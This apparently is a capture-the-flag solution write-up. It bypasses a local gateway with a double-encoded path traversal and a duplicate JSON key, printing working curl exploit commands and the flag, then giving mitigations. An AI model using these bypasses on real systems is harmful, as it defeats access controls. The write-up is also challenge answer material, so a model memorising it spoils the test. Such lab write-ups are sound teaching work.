# Solution

## Vulnerability Summary

The challenge contains two parser differentials.

1. The gateway checks the raw path, while the backend decodes twice and normalizes the path.
2. The gateway keeps the first duplicate JSON key value, while the backend keeps the last duplicate JSON key value.

## Step 1. Direct internal access is blocked

```bash
curl -i -X POST 'http://localhost:8080/api/internal/report' \
  -H 'Content-Type: application/json' \
  --data '{"scope":"internal"}'
```

The gateway rejects this because the raw path does not start with `/api/public/`.

## Step 2. Abuse path interpretation differential

The gateway only checks the raw path prefix:

```text
/api/public/
```

The backend performs repeated URL decoding and path normalization.

A path such as this passes the gateway:

```text
/api/public/%252e%252e/internal/report
```

Backend interpretation:

```text
/api/public/%252e%252e/internal/report
-> /api/public/%2e%2e/internal/report
-> /api/public/../internal/report
-> /api/internal/report
```

At this point the request reaches the internal backend route, but the backend still requires `scope=internal`.

## Step 3. Abuse duplicate JSON key interpretation differential

The gateway parser keeps the first duplicate key value:

```json
{"scope":"public","scope":"internal"}
```

Gateway interpretation:

```json
{"scope":"public"}
```

Backend interpretation:

```json
{"scope":"internal"}
```

## Final Exploit

```bash
curl -i -X POST 'http://localhost:8080/api/public/%252e%252e/internal/report' \
  -H 'Content-Type: application/json' \
  --data '{"scope":"public","scope":"internal"}'
```

Expected response:

```json
{
  "title": "Internal Security Report",
  "scope": "internal",
  "flag": "WSL{mind_the_interpretation_gap}"
}
```

## Root Cause

Access control was performed before canonicalization and with a different parser than the backend business logic.

Security-sensitive decisions should be made on a single canonical representation of the request.

## Mitigation Ideas

- Normalize and canonicalize paths before authorization.
- Reject ambiguous encodings such as double-encoded path traversal sequences.
- Reject duplicate JSON keys at the gateway.
- Use the same parser or shared validation layer for gateway and backend.
- Avoid making authorization decisions on representations that downstream services will reinterpret.
